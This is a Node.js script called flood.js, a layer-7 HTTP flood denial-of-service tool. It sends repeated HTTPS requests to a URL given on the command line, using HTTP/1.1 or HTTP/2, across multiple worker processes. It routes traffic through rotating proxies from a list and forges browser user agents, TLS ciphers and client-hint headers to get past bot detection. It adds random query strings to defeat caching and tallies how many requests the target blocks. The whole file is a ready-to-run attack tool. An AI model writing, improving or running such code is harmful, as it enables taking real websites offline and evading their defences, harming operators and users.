const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);

if (process.argv.length < 5) {
    console.log(`Usage: node flood.js <url> <time> <rate> <threads>`);
    console.log(`With proxy: node flood.js https://target.com 120 30 4`);
    console.log(`No proxy: node flood.js https://target.com 120 30 4 --noproxy`);
    process.exit();
}

const useProxy = process.argv[6] !== "--noproxy";
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5])
};

const parsedTarget = url.parse(args.target);
const isH2Supported = args.target.includes("h2") || false;

// Browser realistic ciphers
const ciphers = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384"
].join(":");

// Modern browser user agents
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
];

// Modern browser headers
const getHeaders = (host, path, isH2) => {
    const baseHeaders = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-Ch-Ua": '"Not A(Brand";v="99", "Google Chrome";v="123", "Chromium";v="123"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
        "Connection": "keep-alive"
    };
    
    if (isH2) {
        return {
            [":method"]: "GET",
            [":path"]: path,
            [":scheme"]: "https",
            [":authority"]: host,
            ...baseHeaders
        };
    }
    
    return {
        "Host": host,
        ...baseHeaders
    };
};

let proxies = [];
if (useProxy) {
    try {
        proxies = fs.readFileSync("proxy.txt", "utf8").split(/\r?\n/).filter(l => l.trim());
        console.log(`📡 Loaded ${proxies.length} proxies`);
    } catch(e) {
        console.log(`⚠️ No proxy.txt, direct mode`);
    }
}

let stats = { total: 0, success: 0, blocked: 0, error: 0, active: 0 };

if (cluster.isMaster) {
    console.log(`\n🔥 FLOOD ATTACK`);
    console.log(`🎯 Target: ${args.target}`);
    console.log(`⏱️ Duration: ${args.time}s`);
    console.log(`⚡ Rate: ${args.rate} req/s`);
    console.log(`🧵 Threads: ${args.threads}`);
    console.log(`🌐 Proxy: ${useProxy && proxies.length ? "ON" : "OFF"}`);
    console.log(`📡 Protocol: ${isH2Supported ? "HTTP/2" : "HTTP/1.1"}`);
    console.log(`====================================\n`);
    
    const statsInterval = setInterval(() => {
        console.log(`[${new Date().toLocaleTimeString()}] Total:${stats.total} ✅:${stats.success} 🚫:${stats.blocked} ❌:${stats.error} 🔗:${stats.active}`);
    }, 3000);
    
    for (let i = 0; i < args.threads; i++) cluster.fork();
    
    setTimeout(() => {
        clearInterval(statsInterval);
        console.log(`\n✅ FINISHED | Total: ${stats.total} | Success: ${stats.success} | Blocked: ${stats.blocked} | Error: ${stats.error}`);
        process.exit(1);
    }, args.time * 1000);
} else {
    const delay = 1000 / args.rate;
    
    const sendRequest = (proxySocket = null) => {
        stats.active++;
        
        const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            ciphers: ciphers,
            honorCipherOrder: true,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            ALPNProtocols: isH2Supported ? ["h2", "http/1.1"] : ["http/1.1"]
        };
        
        if (proxySocket) tlsOptions.socket = proxySocket;
        
        const tlsConn = tls.connect(tlsOptions);
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true);
        
        const randomPath = parsedTarget.path + 
            (parsedTarget.path.includes("?") ? "&" : "?") + 
            "_=" + Math.random() + "&t=" + Date.now();
        
        tlsConn.once("secureConnect", () => {
            if (isH2Supported) {
                // HTTP/2 request
                const client = http2.connect(`https://${parsedTarget.host}`, {
                    createConnection: () => tlsConn,
                    settings: { enablePush: false, maxConcurrentStreams: 100 }
                });
                
                const headers = getHeaders(parsedTarget.host, randomPath, true);
                const req = client.request(headers);
                
                req.on("response", (res) => {
                    const status = res[":status"];
                    stats.total++;
                    if (status === 200 || status === 301 || status === 302) stats.success++;
                    else if (status === 403 || status === 429 || status === 503) stats.blocked++;
                    else stats.error++;
                    req.close();
                });
                req.on("error", () => {
                    stats.total++;
                    stats.error++;
                });
                req.end();
                
                setTimeout(() => {
                    client.destroy();
                    tlsConn.destroy();
                    if (proxySocket) proxySocket.destroy();
                    stats.active--;
                }, 200);
            } else {
                // HTTP/1.1 request
                const headers = getHeaders(parsedTarget.host, randomPath, false);
                let requestStr = `GET ${randomPath} HTTP/1.1\r\n`;
                for (let [key, val] of Object.entries(headers)) {
                    requestStr += `${key}: ${val}\r\n`;
                }
                requestStr += `\r\n`;
                
                tlsConn.write(requestStr);
                
                tlsConn.once("data", (chunk) => {
                    const response = chunk.toString();
                    stats.total++;
                    if (response.includes("200") || response.includes("301") || response.includes("302")) {
                        stats.success++;
                    } else if (response.includes("403") || response.includes("429") || response.includes("503")) {
                        stats.blocked++;
                    } else {
                        stats.error++;
                    }
                    tlsConn.destroy();
                    if (proxySocket) proxySocket.destroy();
                    stats.active--;
                });
                
                setTimeout(() => {
                    if (!tlsConn.destroyed) {
                        tlsConn.destroy();
                        if (proxySocket) proxySocket.destroy();
                        stats.active--;
                    }
                }, 500);
            }
        });
        
        tlsConn.on("error", () => {
            stats.total++;
            stats.error++;
            if (proxySocket) proxySocket.destroy();
            stats.active--;
        });
    };
    
    const sendWithProxy = () => {
        if (!proxies.length) {
            sendRequest(null);
            return;
        }
        
        const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
        const [pHost, pPort] = proxyAddr.split(":");
        
        const proxyConn = net.connect({ host: pHost, port: parseInt(pPort), allowHalfOpen: true });
        proxyConn.setTimeout(5000);
        
        const connectPayload = `CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\nUser-Agent: ${userAgents[Math.floor(Math.random() * userAgents.length)]}\r\n\r\n`;
        
        proxyConn.on("connect", () => {
            proxyConn.write(connectPayload);
        });
        
        proxyConn.on("data", (chunk) => {
            const resp = chunk.toString();
            if (resp.includes("200 Connection established") || resp.includes("200 OK")) {
                proxyConn.removeAllListeners("data");
                sendRequest(proxyConn);
            } else {
                proxyConn.destroy();
                stats.active--;
            }
        });
        
        proxyConn.on("error", () => {
            stats.active--;
        });
        
        proxyConn.on("timeout", () => {
            proxyConn.destroy();
            stats.active--;
        });
    };
    
    setInterval(() => {
        if (stats.active < 5000) {
            if (useProxy && proxies.length) {
                sendWithProxy();
            } else {
                sendRequest(null);
            }
        }
    }, delay);
}

process.on('uncaughtException', () => {});